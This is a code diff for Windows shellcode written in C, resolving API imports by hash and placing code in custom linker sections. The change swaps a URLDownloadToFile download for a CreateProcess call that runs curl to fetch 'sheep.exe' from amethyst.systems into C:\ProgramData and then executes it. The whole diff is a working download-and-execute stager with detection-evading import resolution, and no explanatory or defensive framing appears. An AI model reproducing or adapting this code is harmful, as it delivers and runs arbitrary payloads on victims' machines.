@@ -21,12 +21,17 @@ __declspec(code_seg(".sc$000")) int shellcode(LPVOID arg) {
    iat()->LoadLibrary = (uint8_t * (WINAPI *)(const char *))get_import_by_hash(kernel32, 0x53b2070f);
    iat()->CreateProcess = (BOOL (WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))get_import_by_hash(kernel32, 0x4a7c0a09);
 
-   char urlmon_str[] = {'u','r','l','m','o','n', 0};
-   uint8_t *urlmon = (uint8_t *)iat()->LoadLibrary(&urlmon_str[0]);
-   iat()->URLDownloadToFile = (HRESULT (WINAPI *)(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK))get_import_by_hash(urlmon, 0xd8d746fc);
-
    char *filename = target_filename();
-   char *url = target_url();
+   char *command = download_command();
+
+#if defined(_DEBUG)
+   while (*filename == 0)
+      ++filename;
+
+   while (*command == 0)
+      ++command;
+#endif
+
    STARTUPINFOA startup_info;
    PROCESS_INFORMATION process_information;
 
@@ -38,17 +43,17 @@ __declspec(code_seg(".sc$000")) int shellcode(LPVOID arg) {
    for (size_t i=0; i<sizeof(PROCESS_INFORMATION); ++i)
       ((uint8_t *)(&process_information))[i] = 0;
 
-#if defined(_DEBUG)
-   while (*filename == 0)
-      ++filename;
-
-   while (*url == 0)
-      ++url;
-#endif
-
-   if (iat()->URLDownloadToFile(NULL, url, filename, 0, NULL) != S_OK)
+   if (!iat()->CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_information))
       return 1;
 
+   for (size_t i=0; i<sizeof(STARTUPINFOA); ++i)
+      ((uint8_t *)(&startup_info))[i] = 0;
+   
+   startup_info.cb = sizeof(STARTUPINFOA);
+   
+   for (size_t i=0; i<sizeof(PROCESS_INFORMATION); ++i)
+      ((uint8_t *)(&process_information))[i] = 0;
+   
    if (!iat()->CreateProcess(filename, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_information))
       return 2;
    
@@ -147,12 +152,12 @@ __declspec(allocate(".sc$005")) char TARGET_FILENAME[] = "C:\\ProgramData\\sheep
 
 #if defined(_M_AMD64)
 #pragma section(".sc$006", read, execute)
-__declspec(code_seg(".sc$006")) char *target_url(void) {
-   return &TARGET_URL[0];
+__declspec(code_seg(".sc$006")) char *download_command(void) {
+   return &DOWNLOAD_COMMAND[0];
 }
 #elif defined(_M_IX86)
 #pragma section(".sc$006", read, execute)
-__declspec(code_seg(".sc$006"), naked) char *target_url(void) {
+__declspec(code_seg(".sc$006"), naked) char *download_command(void) {
    __asm {
       call eip_call
    eip_call:
@@ -161,11 +166,11 @@ __declspec(code_seg(".sc$006"), naked) char *target_url(void) {
       ret
    }
 }
-#pragma comment(linker, "/INCLUDE:_TARGET_URL")
+#pragma comment(linker, "/INCLUDE:_DOWNLOAD_COMMAND")
 #endif
 
 #pragma section(".sc$007", read, execute)
-__declspec(allocate(".sc$007")) char TARGET_URL[] = "https://amethyst.systems/sheep.exe";
+__declspec(allocate(".sc$007")) char DOWNLOAD_COMMAND[] = "curl https://amethyst.systems/sheep.exe -o C:\\ProgramData\\sheep.exe";
 
 #pragma section(".sc$008", read, execute)
 __declspec(code_seg(".sc$008")) uint32_t fnv321a(const char *str) {
